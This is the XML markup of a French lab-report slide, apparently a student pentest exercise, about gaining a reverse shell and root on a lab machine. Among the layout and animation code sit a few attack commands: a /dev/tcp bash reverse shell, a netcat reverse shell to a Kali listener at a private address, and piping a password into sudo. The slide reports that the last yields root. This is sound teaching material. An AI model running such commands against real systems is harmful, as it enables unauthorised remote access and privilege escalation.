          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="192024"/>
            <a:ext cx="6929398" cy="580644"/>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fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="174"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="8" presetID="10" presetClass="entr" presetSubtype="0" fill="hold" nodeType="with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fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="5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176"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="176"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="16" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="177"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17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72"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="172"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="28" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="175"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="20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p:bldP spid="171" grpId="0"/>
      <p:bldP spid="172" grpId="0" animBg="1"/>
      <p:bldP spid="174" grpId="0"/>
      <p:bldP spid="175" grpId="0" animBg="1"/>
      <p:bldP spid="17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8" name="Google Shape;298;p16"/>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F172A"/>
              </a:buClr>
              <a:buSzPts val="2700"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Reverse shell &amp; escalade de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>privilèges</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="5303520" cy="4114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48148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>bash -i &gt;&amp; /dev/tcp/...</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>échoue (bash compilé sans /dev/tcp)</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>nc 192.168.56.101 4444 -e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ fonctionne : reverse shell reçu sur Kali</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>echo motdepasse | sudo -S</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ contourne l'absence de TTY interactif</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>whoami retourne root</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ escalade de privilèges confirmée</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Google Shape;300;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044184" y="1515702"/>
            <a:ext cx="5650992" cy="1174836"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5448"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="101600" dist="38100" dir="5400000" algn="bl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="1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1" name="Google Shape;301;p16" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig48_reverse_shell_received.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="1597998"/>
            <a:ext cx="5486400" cy="1010244"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044184" y="2727114"/>
            <a:ext cx="5650992" cy="2926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Listener Netcat sur Kali — connexion reverse shell reçue</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Google Shape;303;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044184" y="3194542"/>
            <a:ext cx="5650992" cy="1200436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5332"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="101600" dist="38100" dir="5400000" algn="bl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="1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4" name="Google Shape;304;p16" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig50_privesc_root.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="3276838"/>
            <a:ext cx="5486400" cy="1035844"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044184" y="4431554"/>
            <a:ext cx="5650992" cy="2926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Séquence complète : identification puis élévation vers root</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="4846320"/>
            <a:ext cx="5486400" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7692"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="4983480"/>
            <a:ext cx="5029200" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="136000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Bilan : les 4 volets d'attaque exigés par le sujet sont validés — scan, brute force, reverse shell, escalade de privilèges.</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p16"/>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B7F"/>
              </a:buClr>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>08</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Image 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25FC2F51-4B19-B314-DEDA-15D645159D4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="192024"/>
            <a:ext cx="6929398" cy="580644"/>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8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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99"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="barn(inVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="299"/>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300"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="300"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="16" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="301"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="301"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="19" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1" fill="hold">
                                          <p:stCondLst>
